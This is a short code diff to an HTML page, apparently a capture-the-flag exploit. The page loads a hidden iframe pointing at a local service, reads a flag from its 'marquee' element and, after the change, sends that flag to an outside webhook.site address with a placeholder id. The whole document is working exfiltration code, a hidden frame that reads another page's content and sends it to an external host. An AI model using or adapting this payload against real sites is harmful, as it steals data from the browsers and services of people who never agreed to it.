@@ -3,13 +3,13 @@
 <body>
 <iframe id="flagframe" src="http://localhost:1337/" style="display:none"></iframe>
 <script>
-setTimeout(() => {
+document.getElementById('flagframe').onload = function() {
   try {
-    let doc = document.getElementById('flagframe').contentDocument;
+    let doc = this.contentDocument;
     let flag = doc.querySelector('marquee').textContent;
-    alert(flag); // Puedes cambiar esto por lo que necesites
+    fetch('https://webhook.site/tu-id?flag=' + encodeURIComponent(flag));
   } catch(e) {}
-}, 1000);
+};
 </script>
 </body>
 </html>
